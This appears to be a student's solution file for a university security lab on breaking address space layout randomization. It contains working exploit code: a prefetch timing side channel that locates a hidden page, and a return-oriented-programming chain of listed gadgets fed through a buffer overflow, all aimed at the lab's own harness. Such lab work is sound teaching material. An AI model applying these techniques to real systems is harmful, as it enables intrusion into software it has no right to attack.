/*
 * Address Space Layout Randomization
 * Part 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <time.h>
#include <mmintrin.h>
#include <xmmintrin.h>
#include <fcntl.h>
#include <errno.h>
#include <stdbool.h>
#include <x86intrin.h>
#include "lab.h"

// Same as in Part 2
extern void vulnerable(char *your_string);
extern void call_me_maybe(uint64_t rdi, uint64_t rsi, uint64_t rdx);

// Your code:
uint64_t find_address(uint64_t low_bound, uint64_t high_bound);
void do_overflow(uint64_t page_addr);

uint64_t get_time_start() {
    unsigned int aux;
    uint64_t start;
    _mm_mfence(); // Ensure previous ops are done
    _mm_lfence(); // Ensure subsequent ops wait
    start = __rdtscp(&aux);
    _mm_lfence(); // Ensure start is read before next ops
    return start;
}

uint64_t get_time_end() {
    unsigned int aux;
    uint64_t end;
    _mm_lfence(); // Ensure ops before end have run
    end = __rdtscp(&aux);
    _mm_mfence(); // Ensure end is read before next ops are visible
    return end;
}


uint64_t find_address(uint64_t low_bound, uint64_t high_bound) {
   

    const int NUM_MEASUREMENTS = 10;
    const int NUM_ADDRESSES = (high_bound - low_bound) / PAGE_SIZE;

    // Allocate memory to store results without printf noise
    uint64_t *deltas = malloc(NUM_ADDRESSES * NUM_MEASUREMENTS * sizeof(uint64_t));
    if (!deltas) {
        printf("Memory allocation failed\n");
        return 0;
    }

    int delta_index = 0;
    for (uint64_t addr = low_bound; addr < high_bound; addr += PAGE_SIZE) {
        for (int i = 0; i < NUM_MEASUREMENTS; i++) {
            uint64_t start, end;
            
            start = get_time_start();
            
            _mm_prefetch((void*)addr, _MM_HINT_T0);
            end = get_time_end();

            deltas[delta_index++] = end - start;
        }
    }

   
    printf("--- Results Summary (Min Delta) ---\n");

    uint64_t overall_min_delta = UINT64_MAX;
    uint64_t address_with_min_delta = 0;
    delta_index = 0;

    for (uint64_t addr = low_bound; addr < high_bound; addr += PAGE_SIZE) {
        uint64_t min_delta_for_addr = UINT64_MAX;
        uint64_t sum_delta = 0;

        for (int i = 0; i < NUM_MEASUREMENTS; i++) {
            uint64_t current_delta = deltas[delta_index++];
            if (current_delta < min_delta_for_addr) {
                min_delta_for_addr = current_delta;
            }
            sum_delta += current_delta;
        }
        uint64_t avg_delta = sum_delta / NUM_MEASUREMENTS;

       
        // printf("Address: %p | Min Delta: %lu | Avg Delta: %lu\n", (void*)addr, min_delta_for_addr, avg_delta);

        
        if (min_delta_for_addr < overall_min_delta) {
            overall_min_delta = min_delta_for_addr;
            address_with_min_delta = addr;
        }
    }

    
    printf("\n--- Overall Lowest Delta Found ---\n");
    printf("Lowest Delta Value: %lu cycles\n", overall_min_delta);
    printf("Corresponding Address: %p\n", (void*)address_with_min_delta);
    
    free(deltas);
    return address_with_min_delta;
}
/*
 * do_overflow
 * Construct the ROP chain and execute it using the gadgets we found by breaking ASLR.
 */
void do_overflow(uint64_t page_addr) {

    // Put your Part 2 code here
    // Use the page you found with find_address
    // and the offsets located from objdump to find your gadgets
    uint64_t your_string[128];

    memset(your_string, 0xFF, sizeof(your_string));
    your_string[127] = 0x000000000000000A;
    /*Disassembly of section .text:

0000000000000000 <gadget1>:
   0:	58                   	pop    %rax
   1:	c3                   	ret
	...

0000000000000010 <gadget2>:
  10:	48 d1 e6             	shl    $1,%rsi
  13:	c3                   	ret
	...

0000000000000020 <gadget3>:
  20:	48 31 ff             	xor    %rdi,%rdi
  23:	c3                   	ret
	...

0000000000000030 <gadget4>:
  30:	48 6b d0 07          	imul   $0x7,%rax,%rdx
  34:	c3                   	ret
	...

0000000000000040 <gadget5>:
  40:	48 ff c7             	inc    %rdi
  43:	c3                   	ret
	...

0000000000000050 <gadget6>:
  50:	48 89 fe             	mov    %rdi,%rsi
  53:	c3                   	ret

    */
    uint64_t gadget1_addr = (uint64_t)page_addr;
    uint64_t gadget2_addr = (uint64_t)page_addr+0x10;
    uint64_t gadget3_addr = (uint64_t)page_addr+0x20;
    uint64_t gadget4_addr = (uint64_t)page_addr+0x30;
    uint64_t gadget5_addr = (uint64_t)page_addr+0x40;
    uint64_t gadget6_addr = (uint64_t)page_addr+0x50;
    uint64_t call_me_maybe_addr = (uint64_t)&call_me_maybe;


    your_string[0]=0x4141414141414141;
    your_string[1]=0x4242424242424242;
    your_string[2]=0x4343434343434343;
    your_string[3]=gadget3_addr;
    your_string[4]=gadget5_addr;
    your_string[5]=gadget5_addr;
    your_string[6]=gadget5_addr;
    your_string[7]=gadget5_addr;
    your_string[8]=gadget6_addr;
    your_string[9]=gadget3_addr;
    your_string[10]=gadget5_addr;
    your_string[11]=gadget5_addr;
    your_string[12]=gadget1_addr;
    your_string[13]=191;
    your_string[14]=gadget4_addr;
    your_string[15]=call_me_maybe_addr;

    
    vulnerable((char *)your_string);


    
    vulnerable((char *)your_string);
}

/*
 * lab_code
 * This is called by main with the bounds for the hidden page, just
 * like in Part 1. You will locate the page and then execute a ROP
 * chain using payloads located in the page.
 */
void lab_code(uint64_t low_bound, uint64_t high_bound) {
    uint64_t found_page = find_address(low_bound, high_bound);
    do_overflow(found_page);
}
